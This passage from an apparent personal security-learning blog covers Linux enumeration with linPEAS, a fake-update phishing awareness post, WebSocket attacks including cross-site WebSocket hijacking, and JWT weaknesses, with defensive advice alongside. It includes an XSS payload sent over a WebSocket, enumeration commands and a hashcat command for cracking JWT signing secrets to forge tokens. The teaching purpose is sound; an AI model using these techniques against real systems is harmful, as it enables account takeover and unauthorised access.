            -i [IP] [-p [PORT(s)]] Scan an IP using nc. By default (no -p), top1000 of nmap will be scanned, but you can select a list of ports instead. Ex: -i 127.0.0.1 -p 53,80,443,8000,8080
             Notice that if you specify some network scan (options -d/-p/-i but NOT -t), no PE check will be performed

        Port forwarding (reverse connection):
            -F LOCAL_IP:LOCAL_PORT:REMOTE_IP:REMOTE_PORT Execute linpeas to forward a port from a your host (LOCAL_IP:LOCAL_PORT) to a remote IP (REMOTE_IP:REMOTE_PORT)

        Firmware recon:
            -f [/FOLDER/PATH] Execute linpeas to search passwords/file permissions misconfigs inside a folder

        Misc:
            -h To show this message
            -w Wait execution between big blocks of checks
            -L Force linpeas execution
            -M Force macpeas execution
            -q Do not show banner
            -N Do not use colours

            </div>
        </div>

        <p>let’s execute the script and redirect its output to a new file called linpeas_results.txt</p>
        
        <div class="terminal-container">
            <div class="terminal-header">
                <div class="dot red"></div>
                <div class="dot yellow"></div>
                <div class="dot green"></div>
            </div>

            <div class="terminal-body">
kali@kali:~$ bash linpeas.sh -a -N > linpeas_results.txt

. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
find: ‘/var/lib/nginx/fastcgi’: Permission denied
find: ‘/var/lib/nginx/uwsgi’: Permission denied
find: ‘/var/lib/nginx/body’: Permission denied
find: ‘/var/lib/nginx/scgi’: Permission denied
[SNIP]

kali@kali:~$ 

            
            </div>
        </div>

        <p>The results can then transferred back to our attacking machine, where we will analyze the results.</p>

        <h4> More Commands for enumeration:</h4>

        <p> Which sudo version is installed </p>

        <div class="terminal-container">
            <div class="terminal-header">
                <div class="dot red"></div>
                <div class="dot yellow"></div>
                <div class="dot green"></div>
            </div>

            <div class="terminal-body">
kali@kali:~$ sudo -V
            </div>
        </div>

        <p>What is the release no. of Ubuntu running</p>

        <div class="terminal-container">
            <div class="terminal-header">
                <div class="dot red"></div>
                <div class="dot yellow"></div>
                <div class="dot green"></div>
            </div>

            <div class="terminal-body">
kali@kali:~$ lsb_release -a
            </div>
        </div>


        </div>
    </div>

    <div class="post" onclick="togglePost(this)">
        <h3>Think Before You Click (Security tips)</h3>
        <div class="post-content">
            <h4>A Click Can Cost You Everything</h4>
            <p>In today’s digital world, hackers don’t need brute force to break into your system, they just need you to click. One of the most common yet deceptive tricks used by cybercriminals is fake software updates or CAPTCHAs. These look exactly like legitimate update prompts from your system or browser, but in reality, they install malware, ransomware, or spyware on your device.</p>

            <p>Watch this short video to see the latest on this growing threat and how to protect yourself. <a class="link" href="https://tinyurl.com/2fraszxu" target="_blank">Youtube</a> important step to understanding this type of attack</p>

            <h4>How Fake Updates Work</h4>
            <p>Cybercriminals use social engineering tactics to make their fake update pop-ups look convincing. Here’s how they do it:</p>
            
            <ul>
                <li><strong>Mimicking Trusted Software</strong> – Attackers design fake update prompts that look identical to real Windows, macOS, or browser updates.</li>
                <li><strong>Urgency & Fear</strong> – Messages like “Your security is at risk!” create a sense of panic, pushing users to act quickly.</li>
                <li><strong>Malicious File Downloads</strong> – Clicking on these fake updates often leads to downloading malware that steals data, installs keyloggers, or takes control of your system.</li>
                <li><strong>Fake Progress Bars</strong> – To add legitimacy, attackers include fake download animations to make the update seem real.</li>
            </ul>

            <h4>Real Life Examples of Fake Update Attacks</h4>
            <ul>
                <li><strong>Fake Chrome & Edge Updates</strong> – Attackers send pop-ups urging users to “update their browser,” but instead, they deliver Trojans that steal sensitive data.</li>
                <li><strong>Windows Security Update Scams</strong> – Users are tricked into downloading a supposed “critical patch” that is actually ransomware.</li>
                <li><strong>Fake Flash Player Updates</strong> – Despite Flash being obsolete, hackers still use fake Flash updates to infect systems with spyware.</li>
            </ul>

            <h4>How to Protect Yourself</h4>
            <ul>
                <li><strong>Never Download Updates from Pop-Ups</strong> – Always update your system through official settings (Windows Update, macOS System Preferences, or software settings).</li>
                <li><strong>Verify Before Clicking</strong> – If an update notification appears, go to the official website and check for updates manually.</li>
                <li><strong>Look for HTTPS & Legitimate Domains</strong> – Never download software from third-party sites that aren’t officially linked to the provider.</li>
                <li><strong>Use Security Software</strong> – Enable antivirus programs and browser security warnings to detect malicious sites.</li>
            </ul>

            <h4>Final Thoughts: Stay Alert, Stay Safe</h4>
            <p>Cybercriminals rely on impulse clicks to spread malware. The next time you see an unexpected update prompt, <strong>pause and think before you click</strong>. Your digital security depends on it.</p>
        </div>
    </div>

    <div class="post" onclick="togglePost(this)">
        <h3>WebSockets</h3>
        <div class="post-content">
            <h4>What is a WebSockets?</h4>
            <p>WebSockets are a modern communication protocol that facilitates full duplex, real time data exchange between a client (typically a web browser) and a server. Unlike traditional HTTP requests, which follow a request response model, WebSockets maintain an open connection, allowing both parties to send and receive data instantly over a single, persistent channel.</p>

            <p>WebSockets are widely used in modern web applications to facilitate real time communication, often transmitting sensitive data such as authentication tokens or user inputs. While WebSockets differ from traditional HTTP requests by maintaining a persistent, full duplex connection, many of the same security vulnerabilities such as cross-site WebSocket hijacking, sqli, XXE, SSRF, CSRF, insecure authentication, or lack of input validation can still occur if not properly mitigated.</p>
            

            <h4>Manipulating WebSocket traffic</h4>
            <ul>
                <li>Intercept and modify WebSocket messages.</li>
                <li>Replay and generate new WebSocket messages.</li>
                <li>Manipulate WebSocket connections.</li>
            </ul>

            <h4>Step</h4>
            <ul>
                <li>Open Burp's browser.</li>
                <li>Browse to the application function that uses WebSockets. You can determine that WebSockets are being used by using the application and looking for entries appearing in the WebSockets history tab within Burp Proxy.</li>
                <li>In the Intercept tab of Burp Proxy, ensure that interception is turned on.</li>
                <li>When a WebSocket message is sent from the browser or server, it will be displayed in the Intercept tab for you to view or modify. Press the Forward button to forward the message.</li>
            </ul>

            <h4>How to replay individual messages and generate new messages.</h4>
            <ul>
                <li>In Burp Proxy, select a message in the WebSockets history, or in the Intercept tab, and choose <strong>"Send to Repeater"</strong> from the context menu.</li>
                <li>In Burp Repeater, you can now edit the message that was selected, and send it repeatedly.</li>
                <li>You can enter a new message and send it in either direction, to the client or server.</li>
                <li>In the <strong>"History"</strong> panel within Burp Repeater, you can view the history of messages that have been transmitted over the WebSocket connection. This includes messages generated by you in Burp Repeater, as well as those sent by the browser or server over the same connection.</li>
                <li>If you want to edit and resend any message in the history panel, select the message and choose <strong>"Edit and resend"</strong> from the context menu.</li>
            </ul>

            <p>We can also manipulate the WebSocket handshake, which is responsible for establishing the connection. Capturing and modifying this handshake may be necessary to access a broader attack surface. Some attacks can cause the connection to drop, so it's important to be able to re-establish it as needed. Tokens or other sensitive data in the original handshake request may become stale and need to be refreshed for continued access or successful exploitation.</p>
            <img src="websockethandshake.png" alt="OSI Model Layers" style="width: 90%; height: 400px; border-radius: 10px;">

            <h4>Manipulate the WebSocket handshake using Burp Repeater</h4>
            <ul>
                <li>Send a WebSocket message to Burp Repeater as already described.</li>
                <li>In Burp Repeater, click on the pencil icon next to the WebSocket URL. This opens a wizard that lets you attach to an existing connected WebSocket, clone a connected WebSocket, or reconnect to a disconnected WebSocket.</li>
                <li>If you choose to clone a connected WebSocket or reconnect to a disconnected WebSocket, the wizard will display full details of the WebSocket handshake request. You can edit these details as needed before the handshake is executed.</li>
                <li>When you click "Connect", Burp will attempt to carry out the configured handshake and display the result. If a new WebSocket connection is successfully established, you can then use it to send new messages in Burp Repeater.</li>
            </ul>

            <h4>WebSockets security vulnerabilities</h4>
            <ul>
                <li>If user input sent over a WebSocket is processed insecurely by the server, it can lead to vulnerabilities such as SQL injection or XML External Entity (XXE) injection.</li>
                <li>Some vulnerabilities triggered through WebSockets may not provide immediate feedback, requiring out-of-band (OAST) techniques to detect them.</li>
                <li>If attacker-controlled data is transmitted via WebSockets to other users, it could lead to client-side vulnerabilities such as cross-site scripting (XSS).</li>
            </ul>
            
            <h4>collaborative whiteboard application (Example)</h4>
            <p>Suppose a collaborative whiteboard application uses WebSockets to send drawing actions from users' browsers to the server. When a user draws a shape, a WebSocket message like the following is sent:</p>
            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="dot red"></div>
                    <div class="dot yellow"></div>
                    <div class="dot green"></div>
                </div>
    
                <div class="terminal-body">
{"action":"draw","shape":"rectangle","color":"blue"}
                </div>
            </div>
            <p>The server then broadcasts this message to all connected clients, and the action is rendered in their browsers like this:</p>

            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="dot red"></div>
                    <div class="dot yellow"></div>
                    <div class="dot green"></div>
                </div>
    
                <div class="terminal-body">
&lt;div class=&quot;shape&quot; data-shape=&quot;rectangle&quot; style=&quot;background-color: blue;&quot;&gt;&lt;/div&gt;
                </div>
            </div>
            <p>Now, if the server fails to validate or sanitize the incoming data, an attacker could exploit this by sending a malicious payload like:</p>
            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="dot red"></div>
                    <div class="dot yellow"></div>
                    <div class="dot green"></div>
                </div>
            
                <div class="terminal-body">
{"action":"draw","shape":"&lt;img src=x onerror='alert(1)'&gt;","color":"red"}
                </div>
            </div>
            <p>This could result in a client-side XSS vulnerability if the payload is rendered directly in the DOM.</p>

            <video controls style="width: 90%; height: 400px; border-radius: 10px;">
                <source src="websocketxss.mp4" type="video/mp4">
                Your browser does not support the video tag.
            </video>

            <h4>Digging Deeper into WebSocket Vulnerabilities</h4>

            <p>Some of the trickiest WebSocket security issues don’t show up until you start messing with the initial handshake the part where the WebSocket connection is first set up. These aren’t your average bugs; they usually come from deeper design problems in how the app is built. Here’s what that looks like in practice:</p>
            <ul>
                <li><strong>Overtrusting HTTP headers:</strong> Some apps rely too heavily on headers like <strong>X-Forwarded-For</strong> to make security decisions, which can be spoofed or manipulated by an attacker. Not a good look.</li>
                <li><strong>Weak session handling:</strong> Since WebSocket communication is tied to the session from the initial handshake, any flaws in how that session is managed can create gaps for exploitation. If the handshake session isn’t locked down, neither is your WebSocket traffic.</li>
                <li><strong>Risky custom headers:</strong> Developers sometimes add their own HTTP headers for functionality but without proper validation, those custom headers can expose a bigger attack surface than expected.</li>
            </ul>


            <p>Some WebSocket security flaws happen when a hacker tricks your browser into connecting to a WebSocket server from a sketchy site they control. This kind of attack is called <strong>Cross-Site WebSocket Hijacking (CSWH)</strong>, and yeah, it’s as shady as it sounds.</p>

            <p>Here’s how it works: the attacker uses a vulnerability called <strong>CSRF (Cross-Site Request Forgery)</strong> during the WebSocket handshake. That’s basically the part where your browser says, “Hey, can I start chatting with this server?” If that handshake isn’t properly locked down, the attacker can piggyback off your session without your knowledge.</p>

            <p>The consequences? Pretty serious. They can:</p>

            <ul>
                <li>Act like <em>you</em> and perform privileged actions (like sending messages, making changes, etc.).</li>
                <li>Access sensitive info that’s only meant for your eyes.</li>
            </ul>

            <p>So even if you’re logged in and doing everything right, a poorly secured WebSocket handshake could let someone else ride your session like a free Uber.</p>
        
            <p>Imagine you’re logged into your favorite online app let’s say a student portal. It uses WebSockets to keep your data up to date in real time, like grades or messages. Now picture this: you visit a random website made by an attacker, and without you even knowing, that site secretly opens a connection to your student portal’s server using WebSockets.</p>

            <p>This kind of attack happens when the app uses only your browser’s cookies to check if you're logged in, without any extra security checks like CSRF tokens. Because of that, the server just assumes the connection is legit since your cookies are still valid.</p>

            <p>Here’s what the attacker can do with this trick:</p>

            <ul>
                <li>Set up their own fake site to quietly talk to the real WebSocket server while you're logged in.</li>
                <li>Send any messages they want to the server, pretending to be you.</li>
                <li>Actually receive responses back from the server yep, they get full two way access.</li>
            </ul>

            <p>This is worse than normal CSRF, where the attacker can only send requests. With this, they can also read what comes back, which could include your private messages, profile info, or anything else the app sends through WebSockets.</p>

            <p>Bottom line: if the app doesn’t use strong protection like CSRF tokens or custom headers during the handshake, it’s like letting someone else take over your group project messages without even logging in.</p>

            <p><strong>How These Attacks Actually Start</strong></p>

            <p>this kind of WebSocket attack basically works the same way as a classic CSRF vulnerability, just with a WebSocket twist. If you want to pull it off (or prevent it, if you're on the defense side), you first need to look at how the app kicks off its WebSocket connections — that’s called the handshake.</p>

            <p>Your goal is to check if those handshake requests are properly protected. In other words, is the app doing anything to make sure the request is really coming from the right user and not some sketchy site?</p>

            <p>Here’s what usually signals a weak spot:</p>

            <ul>
            <li>The handshake only uses browser cookies to know who you are.</li>
            <li>No CSRF tokens or other random values are added to the request to prove it came from the real site.</li>
            </ul>

            <p>If you see a WebSocket handshake that’s just running off cookies with no extra security checks, that’s a green light for attackers. They can trick a browser into starting that handshake from a totally different site, and the server won’t even notice the difference.</p>
        
            <p>Here’s an example of a WebSocket handshake request that looks vulnerable to a CSRF style attack. The only thing identifying the user is a session cookie — there are no extra tokens or custom headers that verify the request actually came from the real website:</p>

            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="dot red"></div>
                    <div class="dot yellow"></div>
                    <div class="dot green"></div>
                </div>
            
                <div class="terminal-body">

GET /gradesocket HTTP/1.1
Host: studentportal.edu
Sec-WebSocket-Version: 13
Connection: keep-alive, Upgrade
Cookie: sessionid=Abc123SuperSecretSession
Upgrade: websocket

                </div>
            </div>
            

            <p>Notice how the session is handled just through the <code>sessionid</code> cookie. That’s risky — if a user visits a sketchy site while logged in, the attacker could hijack this handshake and interact with the server as if they were the user.</p>
            <p><strong>What Happens After a Successful WebSocket Hijack?</strong></p>

            <p>If the WebSocket handshake is open to CSRF, what the attacker does next really depends on how the app uses WebSockets. It’s all about what kind of features are exposed through that connection. Once they’re in, the attacker can do stuff like:</p>

            <ul>
            <li>Send fake WebSocket messages to act like the user  making changes, posting content, or triggering actions they shouldn't be able to.</li>
            <li>Ask for sensitive info through the WebSocket and read the responses  stuff like private messages, personal data, or account details.</li>
            <li>Just chill and wait  if the app sends real time updates over WebSockets, the attacker might not even need to do anything. They can just listen in and collect whatever comes through.</li>
            </ul>

            <p>In short, once the attacker slides into that connection, the damage depends on how much the app trusts whoever’s on the other end of the WebSocket.</p>
            
            <h4>Best Practices for Securing WebSocket Connections</h4>

            <p>WebSocket connections are super useful for building real-time features like chat apps, live notifications, or multiplayer games. But if you do not secure them properly, they can become a serious weakness. Here are some important tips that every developer or security student should follow when working with WebSocket technology:</p>

            <ul>
            <li><strong>Use wss instead of ws</strong> This ensures your WebSocket connection is encrypted using transport layer security, just like how HTTPS protects regular web traffic. It keeps your data safe from attackers who are monitoring the network.</li>

            <li><strong>Do not let users control the WebSocket URL</strong> Always set the WebSocket server address in your code. If users can change it or if the app builds it using user input, that could be used to launch attacks or connect to dangerous servers.</li>

            <li><strong>Protect the handshake with proper validation</strong> During the initial handshake, the app should check for a real token or some kind of unique value that proves the request is coming from your own site. Cookies alone are not enough.</li>

            <li><strong>Always validate data from the WebSocket</strong> Whether the message is coming from the client or the server, treat it as untrusted. Sanitize and validate everything to protect against injection attacks like cross-site scripting or database injections.</li>

            <li><strong>Make sure users are really authenticated</strong> Only allow WebSocket connections from users who are logged in with a valid session. You can use tokens that expire quickly to make this more secure and avoid session abuse.</li>

            <li><strong>Check the origin header on the server side</strong> Even though WebSockets do not follow the same origin policy like regular web requests, you can still inspect the origin during the handshake and block any requests that do not come from your domain.</li>

            <li><strong>Log everything related to WebSocket traffic</strong> Track who is connecting, what messages are being sent, and when. This can help you catch suspicious activity early and investigate if anything goes wrong.</li>
            </ul>

            <p>The main idea is simple. Do not treat WebSocket connections as safe by default. You should treat them like any other part of your application where data is coming and going. If you are writing code, testing security, or reviewing an app, always ask yourself how someone could abuse the connection and how you would stop them.</p>

            <p>Check my write-up for one of the challenges I solved using WebSockets here <a class="link" href="https://medium.com/@vgqxjb/websockfish-picoctf-19d73a8434dc" target="_blank">PicoCTF</a>.</p>
        
        </div>
    </div>

    <div class="post" onclick="togglePost(this)">
        <h3>JSON Web Token attacks and vulnerabilities</h3>
        <div class="post-content">
            <p>JSON Web Tokens (JWTs) are a popular way to securely transmit data between systems using JSON format. They're commonly used for authorization, since they can be digitally signed making them verifiable and trustworthy when used properly. But if you mess up the implementation, they can become a serious security risk. This write-up breaks down the technical side of JWT vulnerabilities and common attack vectors.</p>

            <img src="jwt.png" alt="OSI Model Layers" style="width: 30%; height: 300px; border-radius: 10px;">
            <h4>What are JWTs?</h4>
            <p>Think of a JWT (JSON Web Token) as a secure ID card for your application. It’s a way for systems to send information back and forth, but in a format that’s encrypted and verified to prevent tampering. It’s like a way to prove that you are who you say you are without having to keep all the info on the server.</p>
            <h4>How it works?</h4>
            <p><strong>What it holds:</strong> A JWT can carry information about a user. For example, it might say, "This is user X, and they’re allowed to access these resources." It’s mostly used to handle authentication (proving you're logged in), sessions (keeping track of your login state), and access control (deciding which parts of the app you can use).</p>
            <p><strong>No need to store everything on the server:</strong> With traditional methods, servers would keep track of everything about a user's session. With JWTs, the data is stored in the token itself and sent with each request. This means less server load and no need to constantly query the database.</p>
            <p><strong>Why it’s great for distributed systems:</strong> If your app needs to talk to multiple servers (like in microservices), JWTs are perfect because they let each server independently verify the user's identity without needing to talk to each other.</p>

            <h4>JWT format</h4>
            <p>A JWT consists of 3 parts: a header, a payload, and a signature. These are each separated by a dot.</p>

            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="dot red"></div>
                    <div class="dot yellow"></div>
                    <div class="dot green"></div>
                </div>
            
                <div class="terminal-body">

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
                </div>
            </div>

            <p><strong>📘 Breakdown</strong></p>
            <p>1. Header (Base64-encoded JSON)</p>
            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="dot red"></div>
                    <div class="dot yellow"></div>
                    <div class="dot green"></div>
                </div>
            
                <div class="terminal-body">

{
    "alg": "HS256",
    "typ": "JWT"
}
                </div>
            </div>
            <p>This says: "I'm a JWT and I use HMAC-SHA256 to sign."</p>
            <p>2. Payload (Base64-encoded JSON)</p>
            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="dot red"></div>
                    <div class="dot yellow"></div>
                    <div class="dot green"></div>
                </div>
            
                <div class="terminal-body">

{
    "sub": "1234567890",
    "name": "John Doe",
    "iat": 1516239022
}
                </div>
            </div>
            <p>This is your claims set. sub is the subject (usually a user ID), name is a custom claim, and iat is the issue time.</p>
            <p>3. Signature</p>
            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="dot red"></div>
                    <div class="dot yellow"></div>
                    <div class="dot green"></div>
                </div>
            
                <div class="terminal-body">

HMACSHA256(
    base64UrlEncode(header) + "." + base64UrlEncode(payload),
    your-256-bit-secret
)                      
                </div>
            </div>
            <p>This ensures that the token hasn’t been tampered with. If the signature doesn’t match, the token is toast.</p>
            <p>Anyone who gets their hands on a JWT can decode and inspect its contents no special tools needed. That means the real line of defense isn’t hiding the data; it’s the cryptographic signature that ensures the token hasn’t been tampered with. Without verifying that signature, you’re basically trusting data that could’ve been forged in five seconds.</p>
            <h4>🧠 JWT Signature</h4>
            <p>When a server generates a JWT, it creates a signature by cryptographically hashing the token's header and payload using a secret signing key. This key is known only to the server and is essential to maintaining the token’s integrity.</p>
            <p>The signature acts as a tamper evident seal. Since it’s directly derived from the content of the header and payload, even the slightest change like altering a single character will produce a completely different signature. As a result, the token will fail verification.</p>
            <p>Without access to the server’s secret signing key, it’s computationally infeasible to generate a valid signature for a modified token. This is what makes the signature the cornerstone of trust in any JWT-based system.</p>

            <h4>What is the impact of JWT attacks?</h4>
            <p>If an attacker is able to forge a valid JWT, they gain the ability to:</p>
            <ul>
                <li><strong>Escalate Privileges:</strong> The attacker can modify the payload to elevate their own access level, potentially gaining administrative or elevated user rights within the system.</li>
                <li><strong>Impersonate Users:</strong> By tampering with the payload, the attacker could impersonate legitimate users, gaining unauthorized access to their accounts, and performing actions as if they were that user.</li>
                <li><strong>Take Full Control of Accounts:</strong> In the worst case scenario, the attacker can fully compromise a user’s account by forging a token that grants them complete control, bypassing authentication mechanisms altogether.</li>
            </ul>
            <h3>How do vulnerabilities to JWT attacks arise?</h3>
            <h4>1. Insecure or Weak Secret Key</h4>
            <ul>
            <li><strong>Explanation:</strong> If the secret key used to sign the JWT is weak, easily guessable, or hardcoded, attackers can brute-force or guess it to generate their own valid signatures.</li>
            <li><strong>How it Happens:</strong> Using weak keys like common phrases, predictable strings, or small-sized keys makes the token signing process vulnerable to attacks.</li>
            <li><strong>Mitigation:</strong> Use long, random, and complex keys stored securely (e.g., environment variables, hardware security modules).</li>
            </ul>

            <h4>2. Incorrect or Missing Signature Verification</h4>
            <ul>
            <li><strong>Explanation:</strong> Failure to properly validate the JWT's signature is a critical mistake. If the server does not verify the signature before trusting the data, attackers can alter the payload and still be accepted as valid.</li>
            <li><strong>How it Happens:</strong> If signature verification is disabled or incorrectly implemented (e.g., using `alg=none`), attackers can tamper with the token without being detected.</li>
            <li><strong>Mitigation:</strong> Always verify the signature using the server’s secret key, and never trust tokens that don’t pass this check.</li>
            </ul>

            <h4>3. Using `alg=none` (Algorithm None)</h4>
            <ul>
            <li><strong>Explanation:</strong> If the JWT algorithm is set to `none`, the token is not signed at all, making it possible for an attacker to modify the payload without any signature verification.</li>
            <li><strong>How it Happens:</strong> Some JWT libraries might default to `alg=none` if the algorithm is not specified, which can be exploited if not properly configured.</li>
            <li><strong>Mitigation:</strong> Explicitly set a secure signing algorithm (e.g., `HS256` or `RS256`) and ensure that the server rejects tokens with `alg=none`.</li>
            </ul>

            <h4>4. JWT Expiration (`exp`) Not Set</h4>
            <ul>
            <li><strong>Explanation:</strong> Without an expiration time, JWTs can be valid indefinitely, giving attackers unlimited time to exploit a compromised token.</li>
            <li><strong>How it Happens:</strong> Tokens without an expiration (`exp` claim) don’t expire, allowing attackers to reuse them even after a prolonged period.</li>
            <li><strong>Mitigation:</strong> Always set a reasonable expiration time for tokens, and ensure the server rejects expired tokens.</li>
            </ul>

            <h4>5. Token Storage Vulnerabilities</h4>
            <ul>
            <li><strong>Explanation:</strong> Storing JWTs in insecure locations (e.g., local storage or session storage in the browser) increases the risk of cross-site scripting (XSS) attacks or other client-side vulnerabilities that could allow an attacker to steal tokens.</li>
            <li><strong>How it Happens:</strong> Storing tokens in places that are easily accessible to client-side JavaScript or in cookies without proper flags (like `HttpOnly` and `Secure`) exposes them to theft.</li>
            <li><strong>Mitigation:</strong> Store JWTs securely, ideally in HTTP-only, Secure cookies, or use secure storage mechanisms that protect tokens from XSS.</li>
            </ul>

            <h4>6. Token Leakage Over Insecure Channels</h4>
            <ul>
            <li><strong>Explanation:</strong> If JWTs are transmitted over an insecure channel (like HTTP instead of HTTPS), they can be intercepted by attackers in a **man-in-the-middle (MITM)** attack.</li>
            <li><strong>How it Happens:</strong> Sending tokens over HTTP rather than HTTPS allows attackers to sniff the traffic and steal tokens.</li>
            <li><strong>Mitigation:</strong> Always use HTTPS to encrypt communication between the client and server, protecting JWTs from being intercepted.</li>
            </ul>

            <h4>7. JWT Claims Misuse</h4>
            <ul>
            <li><strong>Explanation:</strong> The claims within the payload, such as `sub` (subject) or `role`, should not be trusted as the sole indicator of the user’s privileges without verifying them against the server's data.</li>
            <li><strong>How it Happens:</strong> If an attacker can modify the payload (e.g., change the `role` claim to `admin`), the server may wrongly grant them higher privileges.</li>
            <li><strong>Mitigation:</strong> Always verify claims against server-side data to ensure they haven’t been tampered with.</li>
            </ul>

            <h4>8. Lack of Audience or Issuer Verification</h4>
            <ul>
            <li><strong>Explanation:</strong> Not verifying the `aud` (audience) and `iss` (issuer) claims makes it easier for attackers to forge tokens with arbitrary data.</li>
            <li><strong>How it Happens:</strong> Some systems may only validate the signature and ignore these claims, which opens the door for attackers to impersonate other systems or users.</li>
            <li><strong>Mitigation:</strong> Ensure proper validation of the `aud` and `iss` claims to confirm that the token is intended for your application and comes from a trusted source.</li>
            </ul>
            <h4>Exploiting Weaknesses in JWT Signature Verification</h4>
            <p>Servers, by default, do not retain any information about the JWTs they generate. Each token is designed to be self-contained, carrying all the necessary data within itself. While this design provides benefits, it also introduces a critical issue: the server has no knowledge of the original token's content or its signature. As a result, if the server fails to properly verify the token’s signature, an attacker could easily manipulate the contents of the token without being detected.</p>
            <p>For Example:</p>
            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="dot red"></div>
                    <div class="dot yellow"></div>
                    <div class="dot green"></div>
                </div>
            
                <div class="terminal-body">

{
    "sub": "1234567890",
    "name": "John Doe",
    "iat": 1516239022,
    "isAdmin": false
}                   
                </div>
            </div>
            <p>If the server uses the name to track sessions, changing this value could allow an attacker to impersonate other users who are currently logged in. Likewise, if the isAdmin flag is used to control access, an attacker could exploit this to escalate their privileges and gain unauthorized admin rights.</p>
            <p>JWT libraries usually offer two separate functions: one for verifying the token's authenticity and another for simply decoding its contents. For example, in the Node.js library jsonwebtoken, there’s verify() to validate the token and decode() to read its data without checking the signature.</p>
            <p>Sometimes, developers mistakenly use the decode() method instead of verify(), which means the application never checks the token’s signature. As a result, it essentially trusts any token, even if it’s been tampered with.</p>
            <h4>Accepting Tokens Without a Signature</h4>
            <p>JWT tokens contain a header that includes an alg parameter, which specifies the algorithm used to sign the token. This tells the server which algorithm it should use to verify the token's signature.</p>
            <h3>Example JWT header:</h3>
            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="dot red"></div>
                    <div class="dot yellow"></div>
                    <div class="dot green"></div>
                </div>
            
                <div class="terminal-body">

{
    "alg": "HS256",
    "typ": "JWT"
}                  
                </div>
            </div>
            <p>The issue arises because the server relies on the alg parameter to determine how to validate the token. If the alg parameter is manipulated, the server could end up trusting a token that hasn't been properly verified. Essentially, an attacker can influence how the server determines whether a token is valid, potentially tricking it into accepting an unsigned or improperly signed token.</p>
            <p>While JWTs can be signed with various algorithms, they can also be created without a signature at all, leading to an "unsecured JWT." In this case, the alg is set to none, meaning no signature is used to validate the token. Although servers should reject tokens that lack a signature due to the obvious security risks, attackers can sometimes bypass these checks by using simple obfuscation techniques, such as changing capitalization or using different encodings. This makes it difficult for the server to identify and filter out unsecured JWTs.</p>
            <h4>Brute-forcing</h4>
            <p>Certain signing algorithms, like HS256 (HMAC + SHA-256), rely on a standalone, arbitrary string as the secret key. This key acts similarly to a password, and it’s essential that it’s not easily guessable or susceptible to brute-force attacks. If an attacker manages to figure out this secret, they can generate their own JWTs with any combination of header and payload, then re sign them with a valid signature using the secret.</p>
            <p>When building JWT based applications, developers can sometimes make critical mistakes, such as forgetting to update default or placeholder secrets. They might even copy code examples from online sources without changing the hardcoded secret included in those snippets. If this happens, it can be relatively easy for an attacker to brute-force the server's secret and gain the ability to create valid JWTs.</p>
            <p>hashcat can be used to brute-force secret keys.</p>
            <h4>How Hashcat Can Be Used to Brute-Force JWT Secret Keys:</h4>
            <ul>
            <li><strong>JWT Signing Algorithm (e.g., HS256):</strong> In the case of the HS256 algorithm (HMAC + SHA-256), the secret key is used to sign the JWT. If an attacker knows the structure of the JWT (the header and payload) but does not have the secret, they can use tools like Hashcat to attempt to guess the secret key.</li>
            <li><strong>Brute-Force Attack:</strong> With Hashcat, an attacker can use brute-force techniques to try all possible combinations of a secret key. This would involve testing different strings against the hash to see if they generate the correct signature for a given JWT. The process typically involves extracting the JWT signature and comparing it against various possible combinations of secret keys until a match is found.</li>
            <li><strong>Attack Modes:</strong> Hashcat supports various attack modes like dictionary, brute-force, hybrid, and rule-based attacks, which can be tailored to fit different scenarios and hash types.</li>
            <li><strong>Use of Wordlists:</strong> If an attacker has some idea about the structure of the secret (e.g., it could be a common word or phrase), they can use a wordlist attack to try common passwords or phrases.</li>
            <li><strong>Distributed Cracking:</strong> Hashcat supports distributed cracking, which can significantly speed up the brute-force process by using multiple GPUs or systems to share the workload.</li>
            <li><strong>Example Scenario:</strong> If a developer leaves the secret key in the code or uses a weak key (e.g., "password123"), an attacker could use Hashcat to try these simple or default keys quickly, leading to the compromise of the JWT and any associated accounts or systems.</li>
            </ul>

            <h3>Requirements</h3>
            <p><strong>1: </strong>You need a valid, signed JWT from the target server</p>
            <p><strong>2: </strong>Wordlist of well-known secrets</p>
            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="dot red"></div>
                    <div class="dot yellow"></div>
                    <div class="dot green"></div>
                </div>
            
                <div class="terminal-body">
hashcat -a 0 -m 16500 jwt wordlist               
                </div>
            </div>
            <p>Hashcat takes the JWT's header and payload, then signs them using each secret from the wordlist. It compares the generated signature with the original signature from the server. If a match is found, Hashcat displays the discovered secret, along with additional relevant details, in the following format:</p>
            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="dot red"></div>
                    <div class="dot yellow"></div>
                    <div class="dot green"></div>
                </div>
            
                <div class="terminal-body">
jwt:identified-secret              
                </div>
            </div>
            <p>Once you have identified the secret key, you can use it to generate a valid signature for any JWT header and payload that you like. </p>
            <h4>Burp Suite:</h4>
            <h4>Modifying JWTs</h4>
            <ul>
            <li>Right-click the request containing the JWT and select <strong>Send to Repeater</strong>.</li>
            <li>In the request panel, navigate to the <strong>JSON Web Token</strong> tab.</li>
            <li>Modify the JSON data as needed in the <strong>Header</strong> and <strong>Payload</strong> sections.</li>
            <li>Click <strong>Sign</strong>. A new dialog will appear.</li>
            <li>In the dialog, choose the correct signing key and click <strong>OK</strong>. The JWT will be re-signed to reflect the updated header and payload values. If you haven’t added a signing key yet, follow the steps below.</li>
            </ul>

            <h4>Adding a JWT Signing Key</h4>
            <ul>
            <li>Go to the <strong>JWT Editor Keys</strong> tab.</li>
            <li>Click the button for the type of key you wish to add (e.g., <strong>New Symmetric Key</strong>). A new dialog will open.</li>
            <li>In the dialog, input the new key:
                <ul>
                    <li>Click <strong>Generate</strong> to create a new key.</li>
                    <li>Alternatively, paste an existing key into the dialog.</li>
                    <li>Edit the key as needed.</li>
                </ul>
            </li>
            <li>Click <strong>OK</strong> to save the key.</li>
